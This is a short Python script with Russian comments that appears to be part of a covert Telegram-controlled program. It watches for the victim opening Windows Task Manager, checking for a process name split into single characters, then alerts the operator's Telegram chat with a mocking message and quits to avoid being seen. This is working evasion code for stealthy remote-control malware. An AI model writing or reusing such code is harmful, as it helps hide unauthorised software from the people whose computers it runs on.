import asyncio
import psutil
import sys
from aiogram import Bot

chat_id = '7031426620'
task = ['T', 'a', 's', 'k', 'm', 'g', 'r', '.', 'e', 'x', 'e']

# В будущем добавить не принудительное завершение, а до тех пор, пока все задачи отправленные в бота не будут выполнены


async def if_taskmgr_open():
    """Шухер программы если поялвяется диспетчер"""
    bot = Bot(token="-")
    while True:
        found = await asyncio.to_thread(lambda:
                                        any(p.info['name'] == ''.join(task) for p in psutil.process_iter(['name']))
                                        )
        if found:
            await bot.send_message(
                chat_id=chat_id,
                text='олух открыл таскмгр'
            )
            sys.exit()
